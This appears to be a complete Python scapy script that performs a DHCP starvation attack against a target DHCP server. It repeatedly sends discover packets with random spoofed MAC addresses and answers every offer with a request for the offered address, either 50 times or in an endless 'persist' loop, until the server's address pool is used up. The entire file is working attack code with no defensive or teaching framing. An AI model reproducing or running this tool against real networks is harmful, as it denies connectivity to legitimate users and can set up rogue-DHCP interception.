import argparse
import subprocess
import optparse
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether


def parse_args():
    parser = argparse.ArgumentParser(usage="DHCPStarvationNEW.py [-h] [-p] [-i IFACE] [-t TARGET]",
                                     description="DHCP Starvation")
    parser.add_argument("-p", "--persist", type=int, help="persistent?", default=0)
    parser.add_argument("-i", "--iface", type=str, help="Interface you wish to use")
    parser.add_argument("-t", "--target", type=str, help="IP of target server")

    args = parser.parse_args()
    return args


def requestPkt(packet):
    if packet[DHCP].options[0][1] == 2:  # check that it is an offer pkt

        src_mac = get_if_hwaddr(conf.iface)
        transaction_id = random.randint(1, 900000000)
        ip_offered = packet[BOOTP].yiaddr

        ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac)
        ip = IP(src='0.0.0.0', dst=target)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=[mac2str(RandMAC())], xid=transaction_id, flags=0xFFFFFF)
        dhcp = DHCP(options=[("message-type", "request"), ("requested_addr", ip_offered), ("end", "0")])

        pkt = ethernet / ip / udp / bootp / dhcp

        sendp(pkt, iface=interface)


def discoverPkt(interface, target):
    src_mac = get_if_hwaddr(conf.iface)
    transaction_id = random.randint(1, 900000000)

    ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac)
    ip = IP(src='0.0.0.0', dst=target)
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=[mac2str(RandMAC())], xid=transaction_id, flags=0xFFFFFF)
    dhcp = DHCP(options=[("message-type", "discover"), "end"])

    pkt = ethernet / ip / udp / bootp / dhcp

    sendp(pkt, iface=interface)


if __name__ == "__main__":

    arg = parse_args()

    interface = arg.iface
    target = arg.target
    persist = arg.persist

    if persist:
        while True:
            discoverPkt(interface, target)
            sniffed = sniff(iface=interface, count=1, filter="port 68 and port 67", prn=requestPkt)

    else:
        count = 0
        while count < 50:  # because ip range between x.x.56.100 and x.x.56.150
            discoverPkt(interface, target)
            sniffed = sniff(iface=interface, count=1, filter="port 68 and port 67", prn=requestPkt)
            count += 1
